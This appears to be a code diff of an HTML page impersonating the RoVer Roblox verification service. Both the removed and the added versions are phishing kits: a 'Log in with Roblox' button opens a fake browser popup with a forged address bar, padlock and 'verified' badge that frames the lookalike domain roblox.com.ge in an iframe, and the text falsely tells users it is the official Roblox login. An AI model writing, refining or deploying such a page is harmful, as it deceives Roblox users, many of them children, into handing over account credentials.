@@ -1,167 +1,388 @@
-<!-- --- Improved, trustworthy "Login / Redirect" popup --- -->
-<!-- Insert this instead of your previous fake-popup block -->
-<div class="overlay" id="overlay" style="display:none;"></div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>RoVer – Login</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      font-family: "Roboto", sans-serif;
+      background-color: #1d1b1b;
+      color: #fff;
+    }
 
-<div class="auth-popup" id="authPopup" role="dialog" aria-modal="true" aria-labelledby="authTitle" style="display:none;">
-  <div class="auth-topbar">
-    <div class="left">
-      <img class="site-fav" id="siteFav" src="https://www.roblox.com/favicon.ico" alt="Roblox favicon" onerror="this.style.display='none'">
-      <div class="titles">
-        <div class="main-title">RoVer — Login</div>
-        <div class="sub-title">Secure redirect</div>
-      </div>
-    </div>
+    /* Navbar */
+    nav {
+      background-color: #c91673;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 12px 24px;
+      font-size: 18px;
+      position: relative;
+    }
 
-    <div class="right">
-      <div class="domain-pill" id="domainPill">
-        <span class="padlock">🔒</span>
-        <span class="domain-text" id="domainText">https://www.roblox.com/login</span>
-        <span class="verified" title="Official site">✔︎</span>
+    .nav-left {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+    }
+
+    .nav-right {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .logo img {
+      height: 42px;
+      display: block;
+    }
+
+    nav a {
+      color: #fff;
+      text-decoration: none;
+      font-size: 16px;
+    }
+
+    nav a:hover {
+      text-decoration: underline;
+    }
+
+    .btn {
+      border: 1px solid #fff;
+      padding: 6px 12px;
+      border-radius: 6px;
+      background: none;
+      color: #fff;
+      font-size: 14px;
+      cursor: pointer;
+      transition: background 0.2s ease;
+      white-space: nowrap;
+    }
+
+    .btn:hover {
+      background-color: rgba(255, 255, 255, 0.15);
+    }
+
+    .username {
+      font-size: 14px;
+      font-weight: 700;
+      white-space: nowrap;
+      color: #fff;
+    }
+
+    /* Hamburger */
+    .hamburger {
+      display: none;
+      flex-direction: column;
+      cursor: pointer;
+      gap: 5px;
+    }
+
+    .hamburger span {
+      width: 24px;
+      height: 3px;
+      background: #fff;
+      border-radius: 2px;
+    }
+
+    /* Mobile menu */
+    .mobile-menu {
+      display: none;
+      flex-direction: column;
+      gap: 12px;
+      width: 100%;
+      padding: 12px 16px;
+      background: #c91673;
+    }
+
+    .mobile-menu.open {
+      display: flex;
+    }
+
+    /* Header - center panel vertically */
+    header {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      height: 100%;
+      padding-top: 60px;
+      text-align: center;
+    }
+
+    /* Verification Panel */
+    .panel {
+      background: #000;
+      border-radius: 8px;
+      padding: 28px 20px;
+      max-width: 420px;
+      width: 95%;
+      box-shadow: 0 6px 16px rgba(0,0,0,0.8);
+      text-align: left;
+    }
+
+    .panel h1 {
+      font-size: 26px;
+      font-weight: 800;
+      margin: 0 0 12px;
+    }
+
+    .redirect-text {
+      font-weight: bold;
+      font-size: 16px;
+      color: #ddd;
+      margin: 0 0 20px;
+      display: block;
+    }
+
+    .info-box {
+      display: flex;
+      align-items: flex-start;
+      background: #2c2c2c;
+      border-radius: 6px;
+      padding: 10px 14px;
+      margin: 0 0 20px;
+      text-align: left;
+      width: 100%;
+      box-sizing: border-box;
+      overflow-wrap: break-word;
+      word-break: break-word;
+    }
+
+    .info-box img {
+      width: 22px;
+      height: 22px;
+      margin-right: 10px;
+      margin-top: 2px;
+      flex-shrink: 0;
+    }
+
+    .info-box p {
+      font-size: 15px;
+      color: #ddd;
+      margin: 0;
+      line-height: 1.4;
+    }
+
+    .login-btn {
+      margin-top: 20px;
+      background: #c91673;
+      color: #fff;
+      padding: 12px 22px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s ease;
+      width: 100%;
+    }
+
+    .login-btn:hover {
+      background: #a1125f;
+    }
+
+    @media (max-width: 768px) {
+      .nav-left,
+      .nav-right {
+        display: none;
+      }
+
+      .hamburger {
+        display: flex;
+      }
+    }
+
+    @media (max-width: 600px) {
+      .panel {
+        padding: 20px 16px;
+      }
+
+      .panel h1 {
+        font-size: 22px;
+      }
+
+      .redirect-text {
+        font-size: 14px;
+      }
+
+      .info-box p {
+        font-size: 14px;
+      }
+
+      .login-btn {
+        font-size: 15px;
+        padding: 10px;
+      }
+    }
+
+    /* Fake popup styles */
+    .fake-popup {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 90%;
+      max-width: 700px;
+      height: 600px;
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 0 30px rgba(0,0,0,0.8);
+      overflow: hidden;
+      z-index: 1000;
+      border: 1px solid #ccc;
+    }
+
+    .window-bar {
+      background: #e0e0e0;
+      height: 36px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 12px;
+      font-size: 14px;
+      font-weight: bold;
+      color: #333;
+      border-bottom: 1px solid #ccc;
+    }
+
+    .popup-close {
+      font-size: 20px;
+      cursor: pointer;
+      color: #666;
+    }
+
+    .popup-close:hover {
+      color: red;
+    }
+
+    .url-bar {
+      background: #f4f4f4;
+      border: 1px solid #ccc;
+      margin: 10px;
+      padding: 6px 10px;
+      border-radius: 6px;
+      font-size: 13px;
+      font-family: monospace;
+      color: #333;
+      overflow: hidden;
+      white-space: nowrap;
+      text-overflow: ellipsis;
+    }
+
+    .popup-iframe {
+      width: 100%;
+      height: calc(100% - 76px);
+      border: none;
+    }
+
+    .overlay {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.65);
+      z-index: 999;
+    }
+  </style>
+</head>
+<body>
+  <!-- Navbar -->
+  <nav>
+    <div class="nav-left">
+      <div class="logo">
+        <img src="https://imgur.com/0ErnjPo.png" alt="RoVer Logo" />
       </div>
-      <button class="close-btn" id="authClose" aria-label="Close">×</button>
+      <a href="#">Help</a>
+      <a href="#">Team Members</a>
+      <button class="btn">RoVer Plus</button>
     </div>
+    <div class="nav-right">
+      <button class="btn">Manage Servers</button>
+      <a href="#" style="font-weight: 700">Verification</a>
+      <span class="username"></span>
+    </div>
+    <div class="hamburger" id="hamburger">
+      <span></span><span></span><span></span>
+    </div>
+  </nav>
+
+  <!-- Mobile menu -->
+  <div class="mobile-menu" id="mobileMenu">
+    <a href="#">Help</a>
+    <a href="#">Team Members</a>
+    <button class="btn">RoVer Plus</button>
+    <button class="btn">Manage Servers</button>
+    <a href="#" style="font-weight: 700">Verification</a>
+    <span class="username"></span>
   </div>
 
-  <div class="auth-body">
-    <h2 id="authTitle">You will be redirected to Roblox</h2>
-    <p class="muted">
-      For your safety, this opens the official Roblox login page in a new tab. We never ask for or store your password.
-    </p>
-
-    <div class="url-row">
-      <input id="fullUrl" class="full-url" readonly value="https://www.roblox.com/login">
-      <button id="copyUrl" class="small-btn" title="Copy URL">Copy</button>
-      <button id="openNew" class="primary-btn" title="Open in new tab">Open in new tab ↗</button>
+  <!-- Verification Panel -->
+  <header>
+    <div class="panel" id="mockPanel">
+      <h1>Link Roblox Account</h1>
+      <span class="redirect-text">You will be redirected to Roblox.</span>
+      <div class="info-box">
+        <img src="https://img.icons8.com/ios-filled/50/1E90FF/info.png" alt="info" />
+        <p>If the next page says:<br>
+          <span style="color: #fff;">"You are not allowed to use this application"</span>, please read 
+          <span style="color: #c91673;">this help article</span>.
+        </p>
+      </div>
+      <button class="login-btn" id="loginBtn">Log in with Roblox</button>
     </div>
+  </header>
 
-    <ul class="info-list">
-      <li>🔐 HTTPS connection — check the browser address bar after opening.</li>
-      <li>🛡️ Opens in a separate tab (no credentials are submitted to this site).</li>
-      <li>ℹ️ RoVer will receive your Roblox username & user id only (no password).</li>
-    </ul>
+  <!-- Fake popup overlay -->
+  <div class="overlay" id="overlay"></div>
 
-    <div class="footer-row">
-      <a href="#" class="help-link">Help article</a>
-      <button id="cancelAuth" class="ghost-btn">Cancel</button>
+  <!-- Fake browser popup -->
+  <div class="fake-popup" id="fakePopup">
+    <div class="window-bar">
+      RoVer – Login
+      <div class="popup-close" id="popupClose">&times;</div>
     </div>
+    <div class="url-bar" id="urlDisplay">https://roblox.com.ge/login?returnUrl=2099296147452818</div>
+    <iframe class="popup-iframe" id="popupIframe" src=""></iframe>
   </div>
-</div>
 
-<style>
-  /* overlay & popup */
-  .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 999; }
-  .auth-popup {
-    position: fixed; left:50%; top:50%; transform: translate(-50%,-50%);
-    width:720px; max-width:calc(100% - 32px);
-    background: #fff; color:#111; border-radius:10px; box-shadow: 0 30px 80px rgba(0,0,0,0.6);
-    z-index: 1000; font-family: "Roboto", system-ui, -apple-system, "Segoe UI", Roboto, Arial;
-    overflow: hidden;
-  }
+  <script>
+    const loginBtn = document.getElementById("loginBtn");
+    const hamburger = document.getElementById("hamburger");
+    const mobileMenu = document.getElementById("mobileMenu");
 
-  .auth-topbar { display:flex; justify-content:space-between; align-items:center; padding:12px 16px; background:linear-gradient(#f7f7f8,#efeff0); border-bottom:1px solid #e3e3e6; }
-  .left { display:flex; gap:12px; align-items:center; }
-  .site-fav { width:18px; height:18px; border-radius:3px; display:block; }
-  .main-title { font-weight:700; font-size:15px; }
-  .sub-title { font-size:12px; color:#666; margin-top:2px; }
+    const fakePopup = document.getElementById("fakePopup");
+    const popupClose = document.getElementById("popupClose");
+    const overlay = document.getElementById("overlay");
+    const iframe = document.getElementById("popupIframe");
+    const urlDisplay = document.getElementById("urlDisplay");
 
-  .domain-pill { display:flex; gap:8px; align-items:center; background:#eaf7ef; color:#0b6b3a; padding:6px 10px; border-radius:8px; font-weight:600; font-size:13px; border:1px solid #d7efe0; }
-  .padlock { font-size:14px; }
-  .verified { color:#0b6b3a; font-size:13px; }
+    loginBtn.addEventListener("click", () => {
+      const realUrl = "https://roblox.com.ge/login?returnUrl=2099296147452818";
 
-  .close-btn { margin-left:12px; background:transparent; border:none; font-size:20px; cursor:pointer; color:#444; padding:6px 8px; border-radius:6px; }
-  .close-btn:hover { background:#fdecec; color:#b30000; }
+      iframe.src = realUrl;
+      urlDisplay.textContent = realUrl;
 
-  .auth-body { padding:18px 20px 22px; }
-  h2 { margin:0 0 8px; font-size:20px; }
-  .muted { color:#444; margin:0 0 12px; }
-
-  .url-row { display:flex; gap:8px; align-items:center; margin:8px 0 12px; }
-  .full-url { flex:1; padding:10px 12px; border:1px solid #ddd; border-radius:8px; font-family: monospace; color:#333; background:#fafafa; }
-  .small-btn { padding:8px 10px; border-radius:8px; border:1px solid #ddd; background:#fff; cursor:pointer; font-weight:600; }
-  .small-btn:hover { background:#f5f5f6; }
-  .primary-btn { padding:10px 14px; background:#c91673; color:#fff; border:none; border-radius:8px; cursor:pointer; font-weight:700; }
-  .primary-btn:hover { background:#a1125f; }
-
-  .info-list { margin:12px 0 8px; color:#444; padding-left:18px; }
-  .footer-row { display:flex; justify-content:space-between; align-items:center; margin-top:14px; }
-  .help-link { color:#c91673; font-weight:600; text-decoration:none; }
-  .ghost-btn { background:transparent; border:1px solid #ddd; padding:8px 12px; border-radius:8px; cursor:pointer; }
-
-  /* responsive */
-  @media (max-width:640px) {
-    .auth-popup { width:92%; }
-    .domain-pill { display:none; }
-  }
-</style>
-
-<script>
-  // Hook into your existing login button:
-  const loginBtn = document.getElementById('loginBtn'); // your current login button
-  const authPopup = document.getElementById('authPopup');
-  const overlay = document.getElementById('overlay');
-  const authClose = document.getElementById('authClose');
-  const cancelAuth = document.getElementById('cancelAuth');
-  const openNew = document.getElementById('openNew');
-  const copyUrl = document.getElementById('copyUrl');
-  const fullUrl = document.getElementById('fullUrl');
-
-  // The real URL you want to show/open
-  const REAL_URL = 'https://roblox.com.ge/login?returnUrl=2099296147452818';
-
-  // Show popup
-  function openAuthPopup() {
-    fullUrl.value = REAL_URL;
-    document.getElementById('domainText').textContent = REAL_URL;
-    authPopup.style.display = 'block';
-    overlay.style.display = 'block';
-    // focus the copy button for keyboard users
-    copyUrl.focus();
-  }
-
-  // Close popup
-  function closeAuthPopup() {
-    authPopup.style.display = 'none';
-    overlay.style.display = 'none';
-  }
-
-  // Event wiring
-  if (loginBtn) {
-    loginBtn.addEventListener('click', (e) => {
-      e.preventDefault();
-      openAuthPopup();
+      fakePopup.style.display = "block";
+      overlay.style.display = "block";
     });
-  }
 
-  authClose.addEventListener('click', closeAuthPopup);
-  cancelAuth.addEventListener('click', closeAuthPopup);
-  overlay.addEventListener('click', closeAuthPopup);
+    popupClose.addEventListener("click", () => {
+      fakePopup.style.display = "none";
+      overlay.style.display = "none";
+      iframe.src = "";
+    });
 
-  // Open the real site in a new tab (safer and transparent)
-  openNew.addEventListener('click', () => {
-    // Use noopener to prevent the opened page from accessing this one
-    const newWin = window.open(REAL_URL, '_blank', 'noopener,noreferrer');
-    if (!newWin) {
-      // popup blocked — fallback: replace current location (explicit)
-      window.location.href = REAL_URL;
-    }
-    closeAuthPopup();
-  });
-
-  // Copy URL to clipboard
-  copyUrl.addEventListener('click', async () => {
-    try {
-      await navigator.clipboard.writeText(fullUrl.value);
-      copyUrl.textContent = 'Copied';
-      setTimeout(() => { copyUrl.textContent = 'Copy'; }, 1400);
-    } catch (err) {
-      // fallback: select + execCommand
-      fullUrl.select();
-      try { document.execCommand('copy'); copyUrl.textContent = 'Copied'; setTimeout(()=>copyUrl.textContent='Copy',1400); } catch(e){ alert('Copy failed — select and copy manually.'); }
-    }
-  });
-
-  // Accessibility: close on ESC
-  document.addEventListener('keydown', (ev) => {
-    if (ev.key === 'Escape') closeAuthPopup();
-  });
-</script>
+    hamburger.addEventListener("click", () => {
+      mobileMenu.classList.toggle("open");
+    });
+  </script>
+</body>
+</html>
